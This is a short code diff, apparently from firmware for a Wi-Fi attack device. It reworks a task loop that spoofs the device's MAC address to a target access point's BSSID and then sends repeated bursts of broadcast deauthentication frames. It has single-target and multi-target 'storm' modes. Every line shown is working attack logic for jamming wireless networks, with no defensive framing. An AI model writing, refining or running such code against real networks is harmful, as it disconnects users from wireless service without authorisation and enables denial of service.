@@ -355,30 +355,23 @@ static void hop_task(void *)
         if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
             if (s_mode == TM_SURGICAL) {
-                /* Spoof STA MAC to target so blob sanity check passes. */
-                uint8_t saved_mac[6];
-                wifi_save_sta_mac(saved_mac);
-                wifi_spoof_sta_mac(s_target_bssid);
+                wifi_ap_spoof_begin(s_target_bssid);
                 int bursts = 8;
                 for (int k = 0; k < bursts && s_alive; ++k) {
                     wifi_deauth_broadcast(s_target_bssid, &seq);
                     delay(5);
                 }
-                wifi_spoof_sta_mac(saved_mac);
+                wifi_ap_spoof_end();
             } else if (s_bs_n > 0) {
-                /* Per-AP MAC spoof inside the inner loop. Costly but
-                 * necessary — each BSSID needs the STA MAC to match. */
-                uint8_t saved_mac[6];
-                wifi_save_sta_mac(saved_mac);
                 int bursts = (s_mode == TM_STORM) ? 4 : 2;
                 for (int i = 0; i < s_bs_n && s_alive; ++i) {
-                    wifi_spoof_sta_mac(s_bs[i].bssid);
+                    wifi_ap_spoof_begin(s_bs[i].bssid);
                     for (int k = 0; k < bursts; ++k) {
                         wifi_deauth_broadcast(s_bs[i].bssid, &seq);
                         delay(5);
                     }
+                    wifi_ap_spoof_end();
                 }
-                wifi_spoof_sta_mac(saved_mac);
             }
         }
 
